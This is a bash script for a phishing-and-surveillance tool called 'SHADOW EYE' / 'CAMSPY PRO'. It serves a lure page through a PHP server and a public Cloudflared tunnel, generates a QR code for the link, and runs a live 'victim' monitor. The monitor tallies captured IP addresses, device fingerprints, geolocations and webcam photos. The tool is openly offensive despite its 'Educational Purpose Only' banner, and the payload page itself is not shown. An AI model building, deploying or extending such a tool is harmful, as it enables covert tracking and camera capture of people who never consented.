#!/bin/bash
# SHADOW EYE
# Created by: ATHEX H4CK3R 🔥
# Version: 2.0

declare -A COLORS
COLORS=(
    ["BLACK"]="\e[0;30m"
    ["RED"]="\e[0;91m"
    ["GREEN"]="\e[0;92m"
    ["YELLOW"]="\e[0;93m"
    ["BLUE"]="\e[0;94m"
    ["MAGENTA"]="\e[0;95m"
    ["CYAN"]="\e[0;96m"
    ["WHITE"]="\e[0;97m"
    ["ORANGE"]="\e[38;5;214m"
    ["PURPLE"]="\e[38;5;129m"
    ["PINK"]="\e[38;5;206m"
    ["RESET"]="\e[0m"
    ["BOLD"]="\e[1m"
    ["DIM"]="\e[2m"
    ["BLINK"]="\e[5m"
)

ICON_CHECK="✅"
ICON_ERROR="❌"
ICON_WARN="⚠️"
ICON_INFO="ℹ️"
ICON_LINK="🔗"
ICON_CAMERA="📸"
ICON_LOCATION="📍"
ICON_DEVICE="💻"
ICON_NETWORK="🌐"
ICON_CLOCK="⏱️"
ICON_STOP="⏹️"
ICON_START="▶️"
ICON_DOWNLOAD="📥"
ICON_UPLOAD="📤"
ICON_SETTINGS="⚙️"
ICON_MENU="📋"
ICON_SUCCESS="🎉"

SCRIPT_VERSION="2.0"
SCRIPT_NAME="CAMSPY PRO"
LOG_FILE="camspy_$(date +%Y%m%d).log"
CONFIG_FILE=".camspy_config"
TUNNEL_PID=""
PHP_PID=""

trap 'cleanup_and_exit' SIGINT SIGTERM EXIT

log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

show_spinner() {
    local pid=$1
    local message=$2
    local spinstr='⣾⣽⣻⢿⡿⣟⣯⣷'
    local delay=0.1
    
    printf "${COLORS[CYAN]}    ⏳ $message ${COLORS[RESET]}"
    
    while ps -p $pid > /dev/null 2>&1; do
        local temp=${spinstr#?}
        printf "${COLORS[YELLOW]}[%c]${COLORS[RESET]}" "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b"
    done
    printf "${COLORS[GREEN]}✓${COLORS[RESET]}   \n"
}

show_banner() {
    clear
    
    local colors=(${COLORS[RED]} ${COLORS[ORANGE]} ${COLORS[YELLOW]} ${COLORS[GREEN]} ${COLORS[CYAN]} ${COLORS[BLUE]} ${COLORS[MAGENTA]} ${COLORS[PINK]})
    
    echo -e "${COLORS[BOLD]}"
    
    printf "\n"
    for line in \
    "███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗         ███████╗██╗   ██╗███████╗ "\
    "██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║         ██╔════╝╚██╗ ██╔╝██╔════╝ "\
   " ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║         █████╗   ╚████╔╝ █████╗   "\
    "╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║         ██╔══╝    ╚██╔╝  ██╔══╝   "\
    "███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝         ███████╗   ██║   ███████╗ "\
    "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝          ╚══════╝   ╚═╝   ╚══════╝ "; do
                                                           
        local color=${colors[$((RANDOM % ${#colors[@]}))]}
        printf "    ${color}%s${COLORS[RESET]}\n" "$line"
        sleep 0.1
    done
    
    printf "\n"
    
    # Stylish info box
    echo -e "${COLORS[CYAN]}    ...........................................................................${COLORS[RESET]}"
    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ✰✰✰ ${COLORS[YELLOW]}CREATED BY: ATHEX H4CK3R${COLORS[WHITE]} ✰✰✰          ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ${COLORS[GREEN]}Version: ${SCRIPT_VERSION}${COLORS[WHITE]}                         ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ${COLORS[ORANGE]}${ICON_INFO} Educational Purpose Only ${COLORS[WHITE]}          ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "${COLORS[CYAN]}    ..................................................................................${COLORS[RESET]}"
    
    printf "\n"
}


show_progress() {
    local current=$1
    local total=$2
    local message=$3
    local width=50
    local percentage=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    
    printf "\r    ${COLORS[CYAN]}$message ${COLORS[WHITE]}["
    printf "${COLORS[GREEN]}%${filled}s" | tr ' ' '█'
    printf "${COLORS[DIM]}%${empty}s" | tr ' ' '░'
    printf "${COLORS[WHITE]}] ${COLORS[YELLOW]}%d%%${COLORS[RESET]}" $percentage
}

# Enhanced dependency check
check_dependencies() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    📦 Checking Dependencies${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}///////////////////////////////////////////${COLORS[RESET]}"
    
    local deps=("php" "wget" "curl" "unzip" "openssh")
    local missing=()
    local total=${#deps[@]}
    local current=0
    
    for dep in "${deps[@]}"; do
        ((current++))
        show_progress $current $total "Checking dependencies"
        
        if command -v $dep > /dev/null 2>&1; then
            echo -e "\r    ${COLORS[GREEN]}${ICON_CHECK} $dep: Installed${COLORS[RESET]}          "
        else
            echo -e "\r    ${COLORS[RED]}${ICON_ERROR} $dep: Missing${COLORS[RESET]}            "
            missing+=($dep)
        fi
        sleep 0.3
    done
    
    echo -e "    ${COLORS[DIM]}/////////////////////////////////////////////${COLORS[RESET]}"
    
    # Install missing dependencies
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "\n    ${COLORS[YELLOW]}${ICON_DOWNLOAD} Installing missing packages...${COLORS[RESET]}"
        for dep in "${missing[@]}"; do
            echo -ne "    ${COLORS[CYAN]}Installing $dep...${COLORS[RESET]}"
            if pkg install $dep -y > /dev/null 2>&1; then
                echo -e " ${COLORS[GREEN]}${ICON_CHECK} Done${COLORS[RESET]}"
            else
                echo -e " ${COLORS[RED]}${ICON_ERROR} Failed${COLORS[RESET]}"
            fi
        done
    fi
    
    # Check for cloudflared separately
    echo -ne "    ${COLORS[CYAN]}Checking cloudflared...${COLORS[RESET]}"
    if command -v cloudflared > /dev/null 2>&1; then
        echo -e " ${COLORS[GREEN]}${ICON_CHECK} Installed${COLORS[RESET]}"
    else
        echo -e " ${COLORS[YELLOW]}${ICON_DOWNLOAD} Installing...${COLORS[RESET]}"
        pkg install cloudflared -y > /dev/null 2>&1
    fi
    
    log_message "INFO" "Dependencies checked: ${#missing[@]} missing"
}

# Enhanced menu with styling
show_main_menu() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    ${ICON_MENU} SELECT TUNNELING METHOD${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
    
    local options=(
        "${COLORS[GREEN]}1.${COLORS[WHITE]} Cloudflared ${COLORS[DIM]}(Recommended - Fastest)"
        "${COLORS[YELLOW]}2.${COLORS[WHITE]} Serveo.net ${COLORS[DIM]}(Custom Subdomain Support)"
        "${COLORS[BLUE]}3.${COLORS[WHITE]} Ngrok ${COLORS[DIM]}(Traditional)"
        "${COLORS[MAGENTA]}4.${COLORS[WHITE]} Localhost Only ${COLORS[DIM]}(No Tunnel)"
        "${COLORS[RED]}5.${COLORS[WHITE]} Exit"
    )
    
    for opt in "${options[@]}"; do
        echo -e "    $opt"
    done
    
    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
    echo -ne "\n    ${COLORS[CYAN]}${ICON_INFO} Choose option [1-5]: ${COLORS[RESET]}"
}

# Enhanced Cloudflared server function
start_cloudflared() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    ☁️ Starting Cloudflared Tunnel${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}──────────────────────────────${COLORS[RESET]}"
    
    # Kill existing processes
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f php > /dev/null 2>&1
    
    # Start PHP server
    echo -e "    ${COLORS[CYAN]}${ICON_START} Starting PHP server...${COLORS[RESET]}"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    # Check if PHP started
    if ps -p $PHP_PID > /dev/null 2>&1; then
        echo -e "    ${COLORS[GREEN]}${ICON_CHECK} PHP server running on port 3333${COLORS[RESET]}"
    else
        echo -e "    ${COLORS[RED]}${ICON_ERROR} Failed to start PHP server${COLORS[RESET]}"
        return 1
    fi
    
    # Start Cloudflared
    echo -e "    ${COLORS[CYAN]}${ICON_START} Establishing secure tunnel...${COLORS[RESET]}"
    cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
    TUNNEL_PID=$!
    
    # Wait and get URL
    local timeout=15
    local counter=0
    local cldflared_link=""
    
    echo -ne "    ${COLORS[YELLOW]}Waiting for tunnel"
    while [ -z "$cldflared_link" ] && [ $counter -lt $timeout ]; do
        sleep 1
        echo -ne "."
        cldflared_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' .cld.log 2>/dev/null | head -n1)
        ((counter++))
    done
    echo -e "${COLORS[RESET]}"
    
    if [ -n "$cldflared_link" ]; then
        echo -e "\n    ${COLORS[GREEN]}${ICON_LINK} Tunnel URL: ${COLORS[BOLD]}$cldflared_link${COLORS[RESET]}"
        
        # Update payload
        sed -i "s+forwarding_link+$cldflared_link+g" forwarding_link/index2.html 2>/dev/null
        
        # Save to file
        echo "$cldflared_link" > .last_link
        
        # Show QR code
        echo -e "\n    ${COLORS[CYAN]}📱 QR Code for mobile:${COLORS[RESET]}"
        curl -s "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=$cldflared_link" > .qr.png 2>/dev/null
        echo -e "    ${COLORS[GREEN]}QR saved as .qr.png${COLORS[RESET]}"
        
        return 0
    else
        echo -e "    ${COLORS[RED]}${ICON_ERROR} Failed to establish tunnel${COLORS[RESET]}"
        return 1
    fi
}

# Function to monitor victim activity
monitor_victims() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    👁️ Monitoring Victim Activity${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}//////////////////////////////////////${COLORS[RESET]}"
    echo -e "    ${COLORS[YELLOW]}${ICON_INFO} Press Ctrl+C to stop monitoring${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}//////////////////////////////////////${COLORS[RESET]}\n"
    
    local last_ip_count=0
    local last_log_size=0
    
    while true; do
        clear
        echo -e "${COLORS[BOLD]}${COLORS[CYAN]}    📊 LIVE VICTIM MONITOR${COLORS[RESET]}"
        echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}\n"
        
        # Show current time
        echo -e "    ${COLORS[WHITE]}${ICON_CLOCK} Last Update: $(date '+%H:%M:%S')${COLORS[RESET]}\n"
        
        # Check IP captures
        if [ -f "ip.txt" ]; then
            local ip_count=$(wc -l < ip.txt 2>/dev/null || echo 0)
            if [ $ip_count -gt $last_ip_count ]; then
                echo -e "    ${COLORS[GREEN]}${ICON_CHECK} New IP captured!${COLORS[RESET]}"
                last_ip_count=$ip_count
            fi
            echo -e "    ${COLORS[CYAN]}📌 Total IPs: $ip_count${COLORS[RESET]}"
        fi
        
        # Check log directory
        if [ -d "logs" ]; then
            echo -e "\n    ${COLORS[YELLOW]}📁 Captured Data:${COLORS[RESET]}"
            
            # Device info
            if [ -f "logs/device_info.txt" ]; then
                local device_count=$(grep -c "=== DEVICE INFO" logs/device_info.txt 2>/dev/null || echo 0)
                echo -e "    ${COLORS[WHITE]}  ${ICON_DEVICE} Device fingerprints: $device_count${COLORS[RESET]}"
            fi
            
            # Location info
            if [ -f "logs/location_info.txt" ]; then
                local location_count=$(grep -c "=== LOCATION INFO" logs/location_info.txt 2>/dev/null || echo 0)
                echo -e "    ${COLORS[WHITE]}  ${ICON_LOCATION} Locations captured: $location_count${COLORS[RESET]}"
            fi
            
            # Images
            local image_count=$(ls cam_*.png 2>/dev/null | wc -l)
            echo -e "    ${COLORS[WHITE]}  ${ICON_CAMERA} Images captured: $image_count${COLORS[RESET]}"
        fi
        
        # Show last victim details
        if [ -f "logs/victim_summary.txt" ]; then
            echo -e "\n    ${COLORS[MAGENTA]}📋 Last Victim:${COLORS[RESET]}"
            tail -n 1 logs/victim_summary.txt 2>/dev/null | while read line; do
                echo -e "    ${COLORS[DIM]}$line${COLORS[RESET]}"
            done
        fi
        
        echo -e "\n    ${COLORS[DIM]}................................${COLORS[RESET]}"
        echo -e "    ${COLORS[BLINK]}${COLORS[CYAN]}👁️ Monitoring...${COLORS[RESET]}"
        echo -e "    ${COLORS[DIM]}..................................${COLORS[RESET]}"
        
        sleep 3
    done
}

# Function to show statistics
show_stats() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    📊 CAMPAIGN STATISTICS${COLORS[RESET]}"
    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
    
    # Total victims
    local total_ips=0
    if [ -f "saved.ip.txt" ]; then
        total_ips=$(wc -l < saved.ip.txt)
    fi
    
    # Total images
    local total_images=$(ls cam_*.png 2>/dev/null | wc -l)
    
    # Total locations
    local total_locations=0
    if [ -f "logs/location_info.txt" ]; then
        total_locations=$(grep -c "=== LOCATION INFO" logs/location_info.txt)
    fi
    
    # Display stats in a box
    echo -e "    ${COLORS[CYAN]}................................................${COLORS[RESET]}"
    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_INFO} Total IPs:      ${COLORS[YELLOW]}$total_ips${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_CAMERA} Total Images:   ${COLORS[YELLOW]}$total_images${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_LOCATION} Total Locations: ${COLORS[YELLOW]}$total_locations${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
    echo -e "    ${COLORS[CYAN]}.....................................................${COLORS[RESET]}"
    
    # Show recent victims
    if [ -f "logs/victim_summary.txt" ]; then
        echo -e "\n    ${COLORS[MAGENTA]}📋 Recent Victims:${COLORS[RESET]}"
        echo -e "    ${COLORS[DIM]}────────────────────────${COLORS[RESET]}"
        tail -n 5 logs/victim_summary.txt 2>/dev/null | while read line; do
            echo -e "    ${COLORS[WHITE]}$line${COLORS[RESET]}"
        done
    fi
}

# Enhanced cleanup function
cleanup_and_exit() {
    echo -e "\n\n${COLORS[YELLOW]}${ICON_STOP} Cleaning up processes...${COLORS[RESET]}"
    
    # Kill PHP
    if [ -n "$PHP_PID" ] && kill -0 $PHP_PID 2>/dev/null; then
        kill $PHP_PID 2>/dev/null
        echo -e "  ${COLORS[GREEN]}${ICON_CHECK} PHP stopped${COLORS[RESET]}"
    fi
    
    # Kill tunnel
    if [ -n "$TUNNEL_PID" ] && kill -0 $TUNNEL_PID 2>/dev/null; then
        kill $TUNNEL_PID 2>/dev/null
        echo -e "  ${COLORS[GREEN]}${ICON_CHECK} Tunnel stopped${COLORS[RESET]}"
    fi
    
    # Kill any remaining processes
    pkill -f php 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    pkill -f ngrok 2>/dev/null
    pkill -f ssh 2>/dev/null
    
    echo -e "\n${COLORS[GREEN]}${ICON_SUCCESS} Cleanup complete!${COLORS[RESET]}"
    log_message "INFO" "Script terminated cleanly"
    
    # Show final stats
    show_stats
    
    exit 0
}

# Main function
main() {
    # Show banner
    show_banner
    
    # Log start
    log_message "INFO" "Script started - Version $SCRIPT_VERSION"
    
    # Check dependencies
    check_dependencies
    
    # Show main menu
    while true; do
        show_main_menu
        read -r choice
        
        case $choice in
            1)
                echo -e "\n${COLORS[GREEN]}Selected: Cloudflared${COLORS[RESET]}"
                start_cloudflared
                if [ $? -eq 0 ]; then
                    monitor_victims
                fi
                ;;
            2)
                echo -e "\n${COLORS[YELLOW]}Selected: Serveo.net${COLORS[RESET]}"
                # Add serveo function here
                echo -e "${COLORS[RED]}Coming soon...${COLORS[RESET]}"
                sleep 2
                ;;
            3)
                echo -e "\n${COLORS[BLUE]}Selected: Ngrok${COLORS[RESET]}"
                # Add ngrok function here
                echo -e "${COLORS[RED]}Coming soon...${COLORS[RESET]}"
                sleep 2
                ;;
            4)
                echo -e "\n${COLORS[MAGENTA]}Selected: Localhost Only${COLORS[RESET]}"
                echo -e "${COLORS[YELLOW]}${ICON_WARN} Localhost is only accessible on this device${COLORS[RESET]}"
                # Start local PHP server
                php -S 0.0.0.0:8080 -t forwarding_link/
                ;;
            5)
                echo -e "\n${COLORS[RED]}Exiting...${COLORS[RESET]}"
                cleanup_and_exit
                ;;
            *)
                echo -e "\n${COLORS[RED]}${ICON_ERROR} Invalid option!${COLORS[RESET]}"
                sleep 2
                ;;
        esac
    done
}

# Run main function
main